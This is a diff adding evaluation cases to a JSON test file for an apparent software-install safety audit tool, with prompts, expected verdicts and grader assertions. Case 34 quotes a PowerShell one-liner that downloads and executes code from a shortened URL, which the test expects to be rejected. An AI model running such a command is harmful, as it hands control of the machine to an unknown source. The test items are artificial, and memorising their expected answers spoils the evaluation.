@@ -372,6 +372,140 @@
         {"text": "Verdict is REJECTED", "type": "exact_match"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
+    },
+    {
+      "id": 26,
+      "prompt": "I want to docker pull redis for caching in my local dev environment. Is it safe?",
+      "expected_output": "Tier 1 quick audit. Routes to container-image workflow. `redis` is a Docker Official Image — well-known in-memory data store, massive adoption, maintained by Redis Ltd and the Docker Official Images program. No suspicious registry, no :latest ambiguity (implicit latest is standard for dev use). Verdict APPROVED.",
+      "files": [],
+      "assertions": [
+        {"text": "Subject type is container-image", "type": "contains_concept"},
+        {"text": "Report routes to container-image workflow", "type": "contains_concept"},
+        {"text": "Verdict is APPROVED", "type": "exact_match"},
+        {"text": "Report identifies redis as a Docker Official Image or well-known publisher", "type": "contains_concept"},
+        {"text": "Report is saved to a .md file", "type": "file_exists"},
+        {"text": "## Audit Coverage", "type": "contains_string"}
+      ]
+    },
+    {
+      "id": 27,
+      "prompt": "I want to add this GitHub Action to my CI pipeline: uses: docker/build-push-action@v5. It needs write access to packages. Is it safe?",
+      "expected_output": "Tier 2 standard audit. Routes to ci-action workflow. docker/build-push-action is maintained by Docker (verified publisher), widely used, but the user is requesting packages: write permission which is an elevated scope. The action is pinned to a tag (@v5) rather than a full commit SHA — tag pinning is less secure. Verdict CONDITIONAL: pin to SHA and review whether packages:write scope is strictly necessary.",
+      "files": [],
+      "assertions": [
+        {"text": "Subject type is ci-action", "type": "contains_concept"},
+        {"text": "Report routes to ci-action workflow", "type": "contains_concept"},
+        {"text": "Verdict is CONDITIONAL", "type": "verdict_check"},
+        {"text": "Report mentions SHA pinning or tag-vs-SHA concern", "type": "contains_concept"},
+        {"text": "Report mentions write permission or packages:write concern", "type": "contains_concept"},
+        {"text": "## Audit Coverage", "type": "contains_string"}
+      ]
+    },
+    {
+      "id": 28,
+      "prompt": "Should I install the GitLens VS Code extension? It asks for a lot of permissions and wants me to sign in to GitKraken.",
+      "expected_output": "Tier 2 standard audit. Routes to ide-plugin workflow. GitLens is well-known (tens of millions of installs, verified publisher on VS Code Marketplace), but the freemium model with GitKraken account requirement introduces data-sharing concerns — usage telemetry and sign-in data flow to GitKraken (Axosoft). Verdict CONDITIONAL: review GitKraken privacy policy, sign-in is optional for core features.",
+      "files": [],
+      "assertions": [
+        {"text": "Subject type is ide-plugin", "type": "contains_concept"},
+        {"text": "Report routes to ide-plugin workflow", "type": "contains_concept"},
+        {"text": "Verdict is CONDITIONAL or APPROVED", "type": "verdict_check"},
+        {"text": "Report mentions GitKraken account or data-sharing concern", "type": "contains_concept"},
+        {"text": "## Audit Coverage", "type": "contains_string"}
+      ]
+    },
+    {
+      "id": 29,
+      "prompt": "I want to install OBS Studio for screen recording. The download page offers both the official installer and a Microsoft Store version. Which should I use?",
+      "expected_output": "Tier 2 standard audit. Routes to desktop-app workflow. OBS Studio is well-known open-source screen recording software from the OBS Project. The dual-distribution question is an edge case: both the official installer (obsproject.com) and the Microsoft Store version are legitimate distribution channels — MS Store version may have sandbox restrictions but is signed and reviewed. Verdict APPROVED or CONDITIONAL. Should recommend the official installer or MS Store version and note provenance verification for each.",
+      "files": [],
+      "assertions": [
+        {"text": "Subject type is desktop-app", "type": "contains_concept"},
+        {"text": "Report routes to desktop-app workflow", "type": "contains_concept"},
+        {"text": "Verdict is APPROVED or CONDITIONAL", "type": "verdict_check"},
+        {"text": "Report mentions provenance or distribution channel comparison", "type": "contains_concept"},
+        {"text": "## Audit Coverage", "type": "contains_string"}
+      ]
+    },
+    {
+      "id": 30,
+      "prompt": "I want to install terraform from HashiCorp. My company proxy blocks releases.hashicorp.com so a colleague put the binary on a shared network drive. Can I use that copy?",
+      "expected_output": "Tier 2/3 audit. Routes to cli-binary workflow. Terraform itself is high-trust (HashiCorp/IBM, official binary with SHA256SUMS and GPG signature), but the shared-drive copy breaks the provenance chain — the binary cannot be verified as unmodified without comparing against the official SHA256SUMS. Verdict CONDITIONAL: verify the binary checksum against HashiCorp's published SHA256SUMS before use, or obtain through an official channel (Homebrew, apt, official installer).",
+      "files": [],
+      "assertions": [
+        {"text": "Subject type is cli-binary", "type": "contains_concept"},
+        {"text": "Report routes to cli-binary workflow", "type": "contains_concept"},
+        {"text": "Verdict is CONDITIONAL", "type": "verdict_check"},
+        {"text": "Report mentions checksum or signature verification", "type": "contains_concept"},
+        {"text": "Report mentions provenance concern with shared drive or third-party copy", "type": "contains_concept"},
+        {"text": "## Audit Coverage", "type": "contains_string"}
+      ]
+    },
+    {
+      "id": 31,
+      "prompt": "I want to add the Brave Search MCP server to my Claude Desktop setup. It says it needs an API key. Is this safe?",
+      "expected_output": "Tier 2 standard audit. Routes to agent-extension workflow. Brave Search is a known search provider; the MCP server is community-maintained (not first-party from Brave). The API key requirement creates a credential exposure surface — the key is passed via env var and could be logged or leaked by a malicious or buggy MCP server. Verdict CONDITIONAL: verify the MCP server source/publisher, review API key scope, ensure key is not logged or exposed.",
+      "files": [],
+      "assertions": [
+        {"text": "Subject type is agent-extension", "type": "contains_concept"},
+        {"text": "Report routes to agent-extension workflow", "type": "contains_concept"},
+        {"text": "Verdict is CONDITIONAL or APPROVED", "type": "verdict_check"},
+        {"text": "Report mentions API key or credential exposure concern", "type": "contains_concept"},
+        {"text": "## Audit Coverage", "type": "contains_string"}
+      ]
+    },
+    {
+      "id": 32,
+      "prompt": "Our team wants to connect Zapier to our GitHub org to automate issue labeling. Zapier needs repo and org read access. Is this safe?",
+      "expected_output": "Tier 2 standard audit. Routes to remote-integration workflow. Zapier is a well-known automation platform (Zapier Inc, established vendor), but org-level GitHub access with repo read is broad — it covers all repositories in the org, not just specific ones. Verdict CONDITIONAL: restrict to minimum necessary repositories via fine-grained token, review Zapier's data retention policy, ensure only required repos are accessible.",
+      "files": [],
+      "assertions": [
+        {"text": "Subject type is remote-integration", "type": "contains_concept"},
+        {"text": "Report routes to remote-integration workflow", "type": "contains_concept"},
+        {"text": "Verdict is CONDITIONAL", "type": "verdict_check"},
+        {"text": "Report mentions scope or permission breadth concern", "type": "contains_concept"},
+        {"text": "Report mentions data access or retention concern", "type": "contains_concept"},
+        {"text": "## Audit Coverage", "type": "contains_string"}
+      ]
+    },
+    {
+      "id": 33,
+      "prompt": "My team uses an internal tool called 'buildwatch' that we access through a web portal at buildwatch.internal.company.com. IT says we need to 'install' it but really it's just bookmarking the URL and accepting a browser certificate. Is this safe?",
+      "expected_output": "Low classifier confidence — not a package, extension, container, or app in the traditional sense. Routes to generic.md fallback. Probe phase should clarify: this is a web portal accessed via browser, not a traditional installable artifact. The only trust boundary is the browser certificate acceptance. Verdict APPROVED or CONDITIONAL (verify the certificate is issued by the company's internal CA, not self-signed by an unknown party).",
+      "files": [],
+      "assertions": [
+        {"text": "Report routes to generic fallback or low-confidence path", "type": "contains_concept"},
+        {"text": "Report mentions classifier uncertainty or ambiguous subject type", "type": "contains_concept"},
+        {"text": "Report is saved to a .md file", "type": "file_exists"},
+        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Audit confidence", "type": "contains_concept"}
+      ]
+    },
+    {
+      "id": 34,
+      "prompt": "Someone on a forum said I should run this PowerShell one-liner to install a productivity tool: iex ((New-Object System.Net.WebClient).DownloadString('http://bit.ly/toolsetup')). Is this safe?",
+      "expected_output": "Low classifier confidence — could be cli-binary, desktop-app, or something else; the subject type is unclear from the prompt. Routes to generic.md fallback. The iex (Invoke-Expression) pattern combined with a shortened URL is a major red flag regardless of subject type: this is a classic remote code execution vector with no provenance, no checksum, no publisher identity. Verdict REJECTED.",
+      "files": [],
+      "assertions": [
+        {"text": "Report routes to generic fallback or low-confidence path", "type": "contains_concept"},
+        {"text": "Verdict is REJECTED", "type": "exact_match"},
+        {"text": "Report mentions remote code execution or iex risk", "type": "contains_concept"},
+        {"text": "Report mentions shortened URL as a red flag", "type": "contains_concept"},
+        {"text": "## Audit Coverage", "type": "contains_string"}
+      ]
+    },
+    {
+      "id": 35,
+      "prompt": "I found a GitHub repo that has a Dockerfile, an npm package, AND a VS Code extension all in one monorepo. The README says 'just run make install'. Should I?",
+      "expected_output": "Low classifier confidence — multiple competing subject types (container-image, registry-package, ide-plugin) in one repo; no single innermost trust boundary is clear. Routes to generic.md fallback. Probe phase should ask the user to clarify which component they intend to install. The `make install` pattern also warrants Makefile review before execution. Verdict depends on clarification; report should flag the ambiguity and the Makefile review requirement.",
+      "files": [],
+      "assertions": [
+        {"text": "Report routes to generic fallback or low-confidence path", "type": "contains_concept"},
+        {"text": "Report mentions multiple subject types or ambiguity", "type": "contains_concept"},
+        {"text": "Report mentions need for clarification on which component to install", "type": "contains_concept"},
+        {"text": "Report is saved to a .md file", "type": "file_exists"},
+        {"text": "## Audit Coverage", "type": "contains_string"}
+      ]
     }
   ]
 }
